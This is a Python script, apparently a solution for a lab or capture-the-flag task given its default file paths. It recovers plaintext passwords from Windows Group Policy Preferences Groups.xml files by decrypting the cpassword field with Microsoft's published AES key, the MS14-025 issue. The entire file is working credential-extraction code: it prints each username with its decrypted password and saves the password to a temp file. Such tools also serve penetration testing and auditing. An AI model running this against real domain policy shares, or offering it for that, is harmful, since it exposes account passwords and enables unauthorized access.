#!/usr/bin/env python3
"""

Decrypt Microsoft Group Policy Preferences (GPP) cpassword.

The cpassword in Groups.xml is encrypted with a well-known AES-256-CBC key
that Microsoft published (and later deprecated). This script extracts and
decrypts it.

Reference: MS14-025, MSDN AES key disclosure
"""
import base64
import sys
import xml.etree.ElementTree as ET
from Crypto.Cipher import AES

# Microsoft's published AES-256 key for GPP
MS_GPP_KEY = bytes.fromhex(
    "4e9906e8fcb66cc9faf49310620ffee8"
    "f496e806cc057990209b09a433b66c1b"
)
IV = b"\x00" * 16


def decrypt_cpassword(cpassword_b64):
    """Decrypt a GPP cpassword value."""
    # Add padding if needed (GPP sometimes strips trailing =)
    pad = 4 - len(cpassword_b64) % 4
    if pad != 4:
        cpassword_b64 += "=" * pad

    encrypted = base64.b64decode(cpassword_b64)
    cipher = AES.new(MS_GPP_KEY, AES.MODE_CBC, IV)
    decrypted = cipher.decrypt(encrypted)

    # Remove PKCS7 padding
    pad_len = decrypted[-1]
    if pad_len < 1 or pad_len > 16:
        raise ValueError(f"Invalid PKCS7 padding: {pad_len}")
    decrypted = decrypted[:-pad_len]

    # GPP passwords are UTF-16LE encoded
    return decrypted.decode("utf-16le")


def main():
    xml_path = sys.argv[1] if len(sys.argv) > 1 else \
        "/app/enterprise/internal-app01/Policies/Groups.xml"
    output_path = sys.argv[2] if len(sys.argv) > 2 else "/tmp/gpp_password.txt"

    tree = ET.parse(xml_path)
    root = tree.getroot()

    found = False
    for user in root.findall(".//User"):
        props = user.find("Properties")
        if props is None:
            continue
        cpassword = props.get("cpassword")
        username = props.get("userName", "unknown")
        if not cpassword:
            continue

        password = decrypt_cpassword(cpassword)
        print(f"[+] User: {username}")
        print(f"[+] Decrypted password: {password}")

        with open(output_path, "w") as f:
            f.write(password)
        found = True

    if not found:
        print("[-] No cpassword found in Groups.xml", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
